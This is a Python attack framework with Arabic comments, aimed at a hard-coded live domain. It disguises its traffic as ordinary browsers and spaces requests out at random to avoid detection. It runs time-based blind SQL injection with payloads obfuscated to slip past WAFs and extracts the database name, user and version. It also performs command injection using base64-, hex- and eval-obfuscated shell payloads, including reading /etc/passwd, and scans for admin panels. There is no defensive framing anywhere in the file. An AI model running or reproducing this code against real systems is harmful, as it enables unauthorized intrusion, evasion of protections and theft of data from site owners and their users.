import requests
import time
import random
import string
import base64
import hashlib
import json
from urllib.parse import quote, unquote

class StealthHTTPClient:
    def __init__(self, base_url, timeout=10):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        
        # تمويه كمتصفح عادي
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
        ]
        
        # توزيع الطلبات عشوائياً
        self.delay_range = (1, 3)
    
    def random_delay(self):
        time.sleep(random.uniform(*self.delay_range))
    
    def send_stealth_request(self, params=None, data=None, headers=None, method='GET'):
        """إرسال طلب مخفي مع تمويه متقدم"""
        self.random_delay()
        
        # headers عشوائية
        default_headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        if headers:
            default_headers.update(headers)
        
        try:
            if method.upper() == 'POST':
                response = self.session.post(
                    self.base_url,
                    data=data,
                    headers=default_headers,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            else:
                response = self.session.get(
                    self.base_url,
                    params=params,
                    headers=default_headers,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            
            return response.elapsed.total_seconds(), response.text, response.status_code, response.headers
            
        except Exception as e:
            return 0, f"Error: {str(e)}", 0, {}

class AdvancedSQLiBypass:
    def __init__(self, http_client, vulnerable_param, min_delay=3, max_delay=7):
        self.http = http_client
        self.param = vulnerable_param
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.waf_techniques = []
    
    def generate_obfuscated_payload(self, condition, technique='random'):
        """توليد payloads معقدة لتخطي الـ WAF"""
        
        techniques = {
            'comment_obfuscation': [
                f"1'/*!50000AND*//*!50000IF*/(({condition}),SLEEP({self.min_delay}),0)/**/--/**/-",
                f"1'/**/AND/**/IF/**/(({condition})/**/,SLEEP({self.min_delay})/**/,0)/**/--+-",
                f"1'%0AAND%0AIF%0A(({condition})%0A,SLEEP({self.min_delay})%0A,0)%0A--%0A-"
            ],
            'case_manipulation': [
                f"1' aNd iF(({condition}),sLeEp({self.min_delay}),0)-- -",
                f"1' AnD If(({condition}),SlEeP({self.min_delay}),0)-- -"
            ],
            'encoding': [
                f"1' AND IF(({condition}),SLEEP({self.min_delay}),0) -- -",
                f"1%27%20AND%20IF%28%28{quote(condition)}%29%2C%20SLEEP%28{self.min_delay}%29%2C%200%29%20--%20-"
            ],
            'whitespace': [
                f"1'%0BAND%0CIF%0D(({condition})%09,SLEEP({self.min_delay})%0A,0)%08--%0F-",
                f"1'%20%20AND%20%20IF%20%20(({condition})%20%20,SLEEP({self.min_delay})%20%20,0)%20%20--%20%20-"
            ]
        }
        
        return random.choice(techniques.get(technique, techniques['comment_obfuscation']))
    
    def adaptive_boolean_test(self, condition):
        """اختبار تكييفي مع محاولات متعددة لتخطي الـ WAF"""
        
        techniques = ['comment_obfuscation', 'case_manipulation', 'encoding', 'whitespace']
        successful_techniques = []
        
        for technique in techniques:
            for delay in [self.min_delay, self.min_delay + 1]:
                payload = self.generate_obfuscated_payload(condition, technique)
                
                params = {self.param: payload}
                response_time, response_text, status_code, headers = self.http.send_stealth_request(params=params)
                
                # تحقق من الاستجابة بدون الاعتماد على التوقيت فقط
                is_successful = self.analyze_response(response_time, response_text, status_code, delay)
                
                if is_successful:
                    successful_techniques.append(technique)
                    self.waf_techniques.append(technique)
                    return True
        
        return False
    
    def analyze_response(self, response_time, response_text, status_code, expected_delay):
        """تحليل متقدم للاستجابة لاكتشاف الحجب"""
        
        # تجنب الحجب بناءً على رموز الحالة
        if status_code in [403, 429, 503]:
            return False
        
        # اكتشاف رسائل الـ WAF في المحتوى
        waf_indicators = ['blocked', 'forbidden', 'waf', 'cloudflare', 'akamai', 'incapsula']
        if any(indicator in response_text.lower() for indicator in waf_indicators):
            return False
        
        # استخدام عتبة مرنة للتأخير
        threshold = expected_delay * 0.7
        return response_time >= threshold
    
    def binary_search_char(self, query, pos):
        """بحث ثنائي سريع بدلاً من البحث الخطي"""
        low, high = 32, 126
        
        while low <= high:
            mid = (low + high) // 2
            condition = f"ASCII(SUBSTRING(({query}), {pos}, 1)) <= {mid}"
            
            if self.adaptive_boolean_test(condition):
                high = mid - 1
            else:
                low = mid + 1
        
        # تأكيد الحرف النهائي
        final_condition = f"ASCII(SUBSTRING(({query}), {pos}, 1)) = {low}"
        if self.adaptive_boolean_test(final_condition) and 32 <= low <= 126:
            return chr(low)
        
        return None
    
    def bulk_extract(self, queries, max_len=30):
        """استخراج جماعي لبيانات متعددة"""
        results = {}
        
        for name, query in queries.items():
            print(f"[+] Extracting: {name}")
            result = ""
            
            for i in range(1, max_len + 1):
                char = self.binary_search_char(query, i)
                if not char:
                    break
                result += char
                print(f"    {name}: {result}")
            
            results[name] = result
        
        return results

class AdvancedCommandInjection:
    def __init__(self, http_client, vulnerable_param):
        self.http = http_client
        self.param = vulnerable_param
        self.obfuscation_techniques = []
    
    def generate_obfuscated_command(self, cmd):
        """توليد أوامر مموهة لتخطي الاكتشاف"""
        
        techniques = [
            # ترميز Base64
            f"echo {base64.b64encode(cmd.encode()).decode()} | base64 -d | sh",
            f"echo {base64.b64encode(cmd.encode()).decode()} | base64 -d | bash",
            
            # ترميز Hex
            f"echo {cmd.encode().hex()} | xxd -p -r | sh",
            
            # استخدام متغيرات shell
            f"c=$({cmd}); echo $c",
            f"x='{cmd}'; eval $x",
            
            # استخدام printf
            f"printf '{{0}}' | sh".format(''.join(f'\\x{byte:02x}' for byte in cmd.encode())),
            
            # استخدام curl مع البيانات
            f"curl -X POST -d @- http://localhost/cmd <<< '{cmd}'"
        ]
        
        return random.choice(techniques)
    
    def execute_stealth_command(self, cmd):
        """تنفيذ أوامر بتقنيات تمويه متقدمة"""
        
        obfuscated_cmd = self.generate_obfuscated_command(cmd)
        
        # توزيع الطلبات على parameters مختلفة
        param_variations = [
            self.param,
            f"{self.param}_input",
            f"exec_{self.param}",
            "command",
            "exec"
        ]
        
        for param_name in param_variations:
            payloads = [
                f"$({obfuscated_cmd})",
                f"`{obfuscated_cmd}`",
                f";{obfuscated_cmd}#",
                f"|{obfuscated_cmd}",
                f"&&{obfuscated_cmd}#"
            ]
            
            for payload in payloads:
                params = {param_name: payload}
                response_time, response_text, status_code, headers = self.http.send_stealth_request(params=params)
                
                # تحليل الاستجابة لاكتشاف التنفيذ الناجح
                if self.detect_success(response_text, cmd):
                    return response_text
        
        return "[No successful execution]"
    
    def detect_success(self, response, original_cmd):
        """اكتشاف تنفيذ ناجح للأمر بناءً على الأنماط"""
        success_indicators = [
            'root', 'bin', 'etc', 'var', 'usr', 'proc',
            'linux', 'system', 'kernel', 'directory'
        ]
        
        return any(indicator in response.lower() for indicator in success_indicators)

class IntelligentRecon:
    def __init__(self, http_client):
        self.http = http_client
        self.discovered_paths = []
    
    def discover_admin_panels(self):
        """اكتشاف ذكي لواجهات الإدارة"""
        
        common_paths = [
            '/admin', '/administrator', '/wp-admin', '/manager', '/login',
            '/controlpanel', '/cp', '/dashboard', '/backend', '/system',
            '/admin/login', '/admin/index', '/admin/dashboard',
            '/user/login', '/auth/login', '/signin'
        ]
        
        # إضافة تباين في الحروف
        case_variations = []
        for path in common_paths:
            case_variations.extend([
                path,
                path.upper(),
                path.title(),
                path.replace('/', '/.//')
            ])
        
        discovered = []
        for path in case_variations:
            test_url = self.http.base_url + path
            _, response, status_code, _ = self.http.send_stealth_request()
            
            if status_code == 200 and any(keyword in response.lower() for keyword in ['login', 'admin', 'password', 'username']):
                discovered.append(path)
                print(f"[+] Discovered admin panel: {path}")
        
        return discovered
    
    def fingerprint_technology(self):
        """بصمة التقنيات المستخدمة"""
        
        tech_indicators = {
            'PHP': ['<?php', '.php', 'PHP Version'],
            'ASP.NET': ['__VIEWSTATE', '.aspx', 'ASP.NET'],
            'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
            'Apache': ['Apache/', 'Server: Apache'],
            'Nginx': ['Server: nginx', 'nginx/']
        }
        
        _, response, _, headers = self.http.send_stealth_request()
        
        detected_tech = []
        for tech, indicators in tech_indicators.items():
            if any(indicator in response or indicator in str(headers) for indicator in indicators):
                detected_tech.append(tech)
        
        return detected_tech

class SmartExploitationFramework:
    def __init__(self, target_url):
        self.target_url = target_url
        self.http = StealthHTTPClient(target_url)
        self.recon = IntelligentRecon(self.http)
        
        # اكتشاف تلقائي للثغرات
        self.detected_vulnerabilities = self.detect_vulnerabilities()
    
    def detect_vulnerabilities(self):
        """اكتشاف ذكي للثغرات المتاحة"""
        print("[+] Scanning for vulnerabilities...")
        
        vulnerabilities = {}
        
        # اختبار SQL Injection
        test_payloads = [
            "'", "1'", "1' AND '1'='1", "1' AND '1'='2"
        ]
        
        for payload in test_payloads:
            for param in ['id', 'page', 'category', 'user']:
                test_params = {param: payload}
                response_time, response, status_code, headers = self.http.send_stealth_request(params=test_params)
                
                if "error" in response.lower() or "mysql" in response.lower() or "sql" in response.lower():
                    vulnerabilities['sql_injection'] = param
                    break
        
        # اختبار Command Injection
        cmd_test_payloads = [';id', '|id', '`id`']
        for payload in cmd_test_payloads:
            for param in ['cmd', 'exec', 'command', 'run']:
                test_params = {param: payload}
                response_time, response, status_code, headers = self.http.send_stealth_request(params=test_params)
                
                if 'uid=' in response or 'gid=' in response:
                    vulnerabilities['command_injection'] = param
                    break
        
        return vulnerabilities
    
    def run_adaptive_exploitation(self):
        """تشغيل استغلال تكييفي بناءً على الاكتشاف"""
        
        print("\n" + "="*60)
        print("ADAPTIVE EXPLOITATION FRAMEWORK")
        print("="*60)
        
        # البصمة التقنية
        technologies = self.recon.fingerprint_technology()
        print(f"[+] Detected technologies: {', '.join(technologies)}")
        
        # اكتشاف لوحات الإدارة
        admin_panels = self.recon.discover_admin_panels()
        print(f"[+] Discovered admin panels: {admin_panels}")
        
        # استغلال SQL Injection إذا تم اكتشافه
        if 'sql_injection' in self.detected_vulnerabilities:
            print(f"\n[+] Exploiting SQL Injection on parameter: {self.detected_vulnerabilities['sql_injection']}")
            self.exploit_sql_injection()
        
        # استغلال Command Injection إذا تم اكتشافه
        if 'command_injection' in self.detected_vulnerabilities:
            print(f"\n[+] Exploiting Command Injection on parameter: {self.detected_vulnerabilities['command_injection']}")
            self.exploit_command_injection()
    
    def exploit_sql_injection(self):
        """استغلال SQL Injection متقدم"""
        
        sqli = AdvancedSQLiBypass(
            self.http, 
            self.detected_vulnerabilities['sql_injection'],
            min_delay=2,
            max_delay=5
        )
        
        # استخراج البيانات المهمة
        critical_queries = {
            'database': 'SELECT DATABASE()',
            'user': 'SELECT CURRENT_USER()',
            'version': 'SELECT @@version'
        }
        
        results = sqli.bulk_extract(critical_queries)
        
        for key, value in results.items():
            print(f"[+] {key}: {value}")
    
    def exploit_command_injection(self):
        """استغلال Command Injection متقدم"""
        
        cmdi = AdvancedCommandInjection(
            self.http,
            self.detected_vulnerabilities['command_injection']
        )
        
        # تنفيذ أوامر استطلاعية
        recon_commands = [
            'whoami',
            'pwd',
            'uname -a',
            'cat /etc/passwd | head -10'
        ]
        
        for cmd in recon_commands:
            print(f"\n[*] Executing: {cmd}")
            result = cmdi.execute_stealth_command(cmd)
            print(f"Result: {result[:200]}...")

# التنفيذ الرئيسي
if __name__ == "__main__":
    target = "https://haram-transfer.com"
    
    # إضافة proxy للاختبار (اختياري)
    # os.environ['HTTP_PROXY'] = 'http://127.0.0.1:8080'
    
    exploit_framework = SmartExploitationFramework(target)
    exploit_framework.run_adaptive_exploitation()